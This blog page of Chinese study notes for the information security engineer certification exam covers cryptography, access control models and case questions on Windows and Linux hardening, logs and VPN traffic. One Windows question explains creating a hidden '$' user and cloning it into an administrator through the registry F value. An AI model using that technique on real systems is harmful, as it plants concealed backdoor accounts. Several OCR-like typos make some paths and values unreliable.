<li><strong>DES</strong>：56位密钥，64位分组，已不安全</li>
<li><strong>3DES</strong>：112&#x2F;168位密钥，64位分组，速度慢</li>
<li><strong>AES</strong>：128&#x2F;192&#x2F;256位密钥，128位分组，当前标准</li>
<li><strong>SM4</strong>：国密对称加密算法</li>
</ul>
<h3 id="3-非对称加密"><a href="#3-非对称加密" class="headerlink" title="3. 非对称加密"></a>3. 非对称加密</h3><ul>
<li><strong>RSA</strong>：基于大整数因子分解，密钥长（1024&#x2F;2048位）</li>
<li><strong>ECC&#x2F;SM2</strong>：基于椭圆曲线，密钥短（160-256位），效率高</li>
<li><strong>DSA</strong>：仅用于签名，不能加密</li>
</ul>
<h3 id="4-哈希算法"><a href="#4-哈希算法" class="headerlink" title="4. 哈希算法"></a>4. 哈希算法</h3><ul>
<li><strong>MD5</strong>：128位输出，已不安全</li>
<li><strong>SHA-1</strong>：160位输出，已不安全</li>
<li><strong>SHA-2</strong>：SHA-256&#x2F;384&#x2F;512，当前标准</li>
<li><strong>SM3</strong>：国密哈希算法，256位输出</li>
</ul>
<h3 id="5-数字签名"><a href="#5-数字签名" class="headerlink" title="5. 数字签名"></a>5. 数字签名</h3><ul>
<li><strong>过程</strong>：哈希→私钥加密→发送</li>
<li><strong>验证</strong>：公钥解密→哈希比对</li>
<li><strong>算法</strong>：RSA、DSA、ECDSA、SM2</li>
</ul>
<h3 id="6-安全协议"><a href="#6-安全协议" class="headerlink" title="6. 安全协议"></a>6. 安全协议</h3><ul>
<li><strong>Kerberos</strong>：基于票据的认证协议</li>
<li><strong>IPsec</strong>：网络层安全协议</li>
<li><strong>SSL&#x2F;TLS</strong>：传输层安全协议</li>
</ul>
<h3 id="7-安全模型"><a href="#7-安全模型" class="headerlink" title="7. 安全模型"></a>7. 安全模型</h3><ul>
<li><strong>DAC</strong>：自主访问控制</li>
<li><strong>MAC</strong>：强制访问控制<ul>
<li>BLP：保护机密性</li>
<li>Biba：保护完整性</li>
</ul>
</li>
<li><strong>RBAC</strong>：基于角色的访问控制（同时具有强制访问控制和自主访问控制属性）</li>
</ul>
<hr>
<h2 id="十二、案例分析"><a href="#十二、案例分析" class="headerlink" title="十二、案例分析"></a>十二、案例分析</h2><h3 id="1-安全配置"><a href="#1-安全配置" class="headerlink" title="1.安全配置"></a>1.安全配置</h3><h4 id="Windows安全配置"><a href="#Windows安全配置" class="headerlink" title="Windows安全配置"></a>Windows安全配置</h4><ol>
<li>默认情况下，终端服务接入服务器时，登录对话框中会显示上次登录的账号名。为增强系统安全，通过修改注册表，将<br>HKLM\software\MicrosoftIWindowsNT\CurrentVersion\winlogon\DontdisplayLastUserName下的REG_SZ的键值改成多少?<br><img src="/image.png" alt="alt text"></li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">问题1：请写出查看计算机上的用户帐号列表的命令</span><br><span class="line">net user / net users</span><br><span class="line"></span><br><span class="line">问题2：请写出创建一个用户名为51cto$，口令是123456的命令</span><br><span class="line">net user &quot;51cto$&quot; &quot;123456&quot; /add</span><br><span class="line">用户名 51cto$ 包含特殊字符 $（在命令行中 $ 是环境变量符号），必须用双引号包裹整个用户名和密码，否则系统会报错（如 The user name could not be found）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">问题3：此时是否能够使用问题1中的net命令查看到刚刚创建的51cto$用户?为什么?</span><br><span class="line">不能；用户名最后用$符号，则创建的用户是隐藏用户，不可以单纯使用net user 查看</span><br><span class="line"></span><br><span class="line">问题4：管理员账号Administrator对应图4-1注册表中Users键值下的哪一项?</span><br><span class="line">默认情况下 Users键值下的000001F4是管理员账号Administrator，(000001F5是Guest账号)</span><br><span class="line"></span><br><span class="line">问题5：图4-1中，51cto$账号对应Users键值下的000003F0，若需要将51cto$账号克隆为管理员账号，需要复制管理员账号的哪个键值?</span><br><span class="line">F (细节)</span><br><span class="line"></span><br><span class="line">问题6：使用克隆账号登入到该计算机，使用什么命令查看当前用户的有效用户名?</span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line">1：启用该策略，不显示上次登录的用户名。</span><br><span class="line">0（默认值）：显示上次登录的用户名。 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>某公司安全管理员小工针对针对公司中的两个连接了VPN的电脑PC1和PC2进行巡查，图3-1是PC1的windows系统中”事件查看器”的事件截图，图3-2为图3-1中第二条事件(红框标记)的详细信息:图3-3是PC2的网络抓包经过某条件语句过滤后的截图。</li>
</ol>
<p><img src="/image-1.png" alt="alt text"></p>
<p><img src="/image-2.png" alt="alt text"></p>
<p><img src="/image-3.png" alt="alt text"></p>
<ul>
<li>问题1：Windows 日志类型，及其查看方式</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1.系统日志：驱动加载失败、系统服务启动异常、硬件错误。</span><br><span class="line">2.安全日志：登录成功/失败、权限变更、策略修改、文件访问审计（需提前配置审核策略）。</span><br><span class="line">3.应用程序日志：软件崩溃、许可证错误、应用服务启动失败</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开事件查看器：eventvwr.msc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看应用程序日志（最新 10 条）</span><br><span class="line">Get-EventLog -LogName Application -Newest 10</span><br><span class="line"></span><br><span class="line"># 查看安全日志（按事件 ID 筛选）</span><br><span class="line">Get-WinEvent -LogName Security | Where-Object &#123;$_.Id -eq 4624&#125;  # 4624=成功登录</span><br><span class="line"></span><br><span class="line"># 查看系统日志（按时间筛选）</span><br><span class="line">Get-WinEvent -LogName System -After (Get-Date).AddHours(-24)  # 过去24小时</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>问题2：图3-1的事件ID为4650，请结合任务类别，判断导致上述日志的最有可能的情况。<br>备选项:</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">A.IPSec主模式协商失败 B.建立了IPsec主模式安全关联</span><br><span class="line">C.IPsec主模式安全关联已结束D.IPSec采用了传输模式成功</span><br><span class="line"></span><br><span class="line">4650</span><br><span class="line">IPsec主模式</span><br><span class="line">主模式安全关联已建立</span><br><span class="line">（协商成功）</span><br><span class="line"></span><br><span class="line">4651</span><br><span class="line">IPsec传输模式</span><br><span class="line">传输模式安全关联已建立</span><br><span class="line">（协商成功）</span><br><span class="line"></span><br><span class="line">4652</span><br><span class="line">IPsec主模式</span><br><span class="line">主模式协商失败</span><br><span class="line"></span><br><span class="line">4653</span><br><span class="line">IPsec传输模式</span><br><span class="line">传输模式协商失败</span><br><span class="line"></span><br><span class="line">4654</span><br><span class="line">IPsec主模式</span><br><span class="line">主模式安全关联已删除（结束）</span><br><span class="line"></span><br><span class="line">4655  </span><br><span class="line">IPsec传输模式</span><br><span class="line">传输模式安全关联已删除</span><br><span class="line">（结束）</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li>问题3：安全事件中的任务类别中IPSec是一种VPN，VPN提供的安全服务主要包括哪些?</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">（1）IPsec VPN 是属于三层协议隧道技术，网络层VPN</span><br><span class="line">（2）远程连接服务，数据加密传输</span><br><span class="line"></span><br><span class="line">VPN主要的安全服务有以下3种:</span><br><span class="line">保密性服务( Confidentiality):防止传输的信息被监听;</span><br><span class="line">完整性服务( lntegrity):防止传输的信息被修改;</span><br><span class="line">认证服务( Authentication):提供用户和设备的访问认证,防止非法接入。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>问题四：请写出建立VPN连接的两端ip地址</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">src: 192.168.0.96</span><br><span class="line">dst: 218.87.227.2</span><br></pre></td></tr></table></figure>

<ul>
<li>问题五：如果要在Wireshark当中过滤出如图3-3的流量分组，请写出在显示过滤框中应输入的过滤表达式。</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">图中的所有分组都ip地址172.16.14.253有关，所以可以设定ip.addr == 172.16.14.253来过滤。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>问题六：通过图3-3的分组分析，<br>网工认为PC2的这些分组是通过L2TP封装了的，但依然存在安全风险，该风险针对的是三大安全目标即保密性、完整性、可用性中的哪个</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">保密性</span><br></pre></td></tr></table></figure>

<ul>
<li>问题七：根据第二条事件(红框标记)的详细信息图3-2，可以判断是PC1通过12tpoveripsec<br>:VPN连接到对端，请写出你的判断依据?</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">L2TP采用专用的隧道协议，该协议运行在UDP的1701端口，图3-2中描述的端口号是1701，</span><br><span class="line">另外通过前面描述的!PSec主模式以及&lt;Dala Name=EspAuhTvpe&gt;%6%16393&lt;/Data&gt;可以判断是通过IPSec提供加密服务。</span><br></pre></td></tr></table></figure>


<hr>
<h4 id="Linux安全配置"><a href="#Linux安全配置" class="headerlink" title="Linux安全配置"></a>Linux安全配置</h4><ol>
<li>在网络信息化环境中，资源不是无限制开放的，而是在一定约束条件下，用户才能使用。一种技术。访问控制是几平所有系统都雲要用到的-访问控制通常按用户身份及其所归属的某项定义组来限制用户对某些信息项的访问，或限制对某些控制功能的使用的一种技术。</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">为适应不同应用场景的访问控制需求，访问控制参考模型不断演变，形成各种各样的访问控制模型，主要有自主访问控制模型、强制访问控制模型、</span><br><span class="line">基于角色的访问控制模型、</span><br><span class="line">基干属性的访问控制模型等。</span><br><span class="line">(1)适合用于操作系统、数据库系统的资源访问的控制模型有:</span><br><span class="line">(2)适合于分布式网络环境和Web服务的模型访问控制模型有:</span><br><span class="line"></span><br><span class="line">(1) 基于角色的访问控制模型， 自主访问控制模型， 强制访问控制模型</span><br><span class="line">(2) 基于属性访问控制模型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">某linux主机上可以看到如下所示的信息: -rwxr-x--- 1root bin 3853 Aug 105:49 javac</span><br><span class="line">则表明采用此种保护位方案的访问控制模型是：(3) </span><br><span class="line">基于角色的访问控制模型（错误）  基于列的访问控制模型（白名单）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">某公司的部分重要资料部署在Apache服务器的Nana/secret日录下，要求只有公司内部的研发部门可以访问，研发部门的子网是172.28.31.0/24，则信息安全工程师应该在Apache的</span><br><span class="line">配置文件(4)中进行修改，文件中的控制配置如下所示，请根据要求补充完整。</span><br><span class="line">&lt;Directory /yanfa/secret&gt;</span><br><span class="line">&lt;Limit GET POST&gt;</span><br><span class="line">deny from (5)</span><br><span class="line">allow from(6)</span><br><span class="line">&lt;/Limit&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">(5) all</span><br><span class="line">(6) 172.28.31.0/24</span><br><span class="line"></span><br><span class="line">Windows IIS FTP服务器提供了三种访问限制技术手段，分别是什么?</span><br><span class="line">1.实现用户账号认证</span><br><span class="line">2.匿名访问控制</span><br><span class="line">3.IP地址限制</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>某公司的网站服务器系统为Linux&#x2F;UNIX，李工作为公司的安全运维工程师，由于工作需要，需要随时随地对服务器远程开展处置工作。李工使用的PC的IP地址为192.168.1.23</li>
</ol>
<p><img src="/image-6.png" alt="alt text"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(1)李工可以通过两种远程方式访问服务器进行运维，请写出两种方式?</span><br><span class="line">  ssh telnet</span><br><span class="line"></span><br><span class="line">(2)请写出上述两种通信协议的默认端口号。</span><br><span class="line">  ssh:22 telnet:23</span><br><span class="line"></span><br><span class="line">(3)出于安全考虑，李工应该选择那种方式进行远程运维?</span><br><span class="line">  ssh</span><br><span class="line"></span><br><span class="line">(4)请写出李工可以选择远程安全登录运维管理的开源工具。</span><br><span class="line">  OpenSSH</span><br><span class="line"></span><br><span class="line">李亮通过SSH登入到服务后，执行cat /etc/passwd 命今点显示如图2-1的画面。文件中的一行记录对应着一个用户,每行记录用冒号(:)分隔为 7 个字段。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1)第2个字段“X&quot;表示用来验证用户合法性的口令，真正的口令存放在什么文件中?(写出完整路径和名称)</span><br><span class="line">  /etc/shadow</span><br><span class="line"></span><br><span class="line">(2)请写出图2-1中权限最低的用户名称。</span><br><span class="line">  bin</span><br><span class="line">(3)请写出图2-1中系统允许远程登陆的用户名称。</span><br><span class="line">  user1 user2 root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UID=0→ root(最高权限)</span><br><span class="line">UID=1~999→系统账户(如 bin, daemon, sshd)</span><br><span class="line">普通用户UID&gt;1000</span><br><span class="line"></span><br><span class="line">若：/bin/bash /bin/sh /usr/bin/zsh 等可交互 Shell → 允许登录</span><br><span class="line">若：/sbin/nologin/bin/false→禁止登录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux中可通过/etc/hosts,allow和/etc/hosts,denv这两个文件分许和禁止远程丰机对本地服务的访问运维。李工对服务器的这两个进行配置，实现禁止除了李工之外的任何主机进行远程，</span><br><span class="line">请写出在这两个文件中加入的配置。</span><br><span class="line"></span><br><span class="line">在/etc/hosts.deny中加入sshd:all:deny(:deny可以不写)</span><br><span class="line">在/etc/hosts.allow中加入sshd:192.168.1.23:allow(:allow可以不写)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">李工通过网络安全监测对系统的网络活动和内部活动进行分析，获取系统当前的状态信息，以发现有可能的异常行为。</span><br><span class="line">(1)李工需要查看系统的活动进程，可以使用什么命令查看?</span><br><span class="line">  ps</span><br><span class="line"></span><br><span class="line">(2)李工需要查看系统中在线的用户信息，可以使用什么命令查看?</span><br><span class="line">  who</span><br><span class="line"></span><br><span class="line">(3)李工需要查看系统中的地址解析缓存表，可以使用什么命令查看?</span><br><span class="line">  arp</span><br><span class="line"></span><br><span class="line">(4)李工需要检查系统中进程使用的文件、tcp/udp端口、用户等相关信息，可以使用什么命令查看?</span><br><span class="line">  lsof</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux服务器的日志文件可提供审计，有助于系统管理员及时发现系统入侵行为或系统安全隐患。</span><br><span class="line">李工根据安全需求查看相关日志:</span><br><span class="line">(1)查看每一次用户登录和注销的历史信息的日志文件是哪个?</span><br><span class="line">(2)查看不良的登入尝试记录的日志文件是哪个?</span><br><span class="line"></span><br><span class="line">(1)-(2)备选答案:</span><br><span class="line">A. lastlog</span><br><span class="line">B. loginlog</span><br><span class="line">C.utmp</span><br><span class="line">D.wtmp</span><br><span class="line">E.sulog</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">审计机制是 UNIXinux系统安全的重要组成部分,审计有助于系统管理员及时发现系统入侵行为或系统安全隐患。不同版本的 UNIXLinux日志文件的目录是不同的,早期版本UNx的审计日志目录放在/usr/adm:较新版本的在/arladm; Solaris,Linux和BSD在 UNIXarlog。常见日志文件如下:lastlog:记录用户最近成功登录的时间;</span><br><span class="line">·loginlog:不良的登录尝试记录;</span><br><span class="line">·messages:记录输出到系统主控台以及由 syslog系统服务程序产生的消息；</span><br><span class="line">·utmp:记录当前登录的每个用户;</span><br><span class="line">·utmpx:扩展的utmp;</span><br><span class="line">·wtmp:记录每一次用户登录和注销的历史信息;</span><br><span class="line">·wimp:扩展的wmp;</span><br><span class="line">·vold.log:记录使用外部介质出现的错误;</span><br><span class="line">·xferkig:记录fp的存取情况,</span><br><span class="line">·sulog:记录su命令的使用情况;</span><br><span class="line">·acct:记录每个用户使用过的命令。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>证书</category>
      </categories>
      <tags>
        <tag>软考</tag>
        <tag>信息安全工程师</tag>
      </tags>
  </entry>
</search>
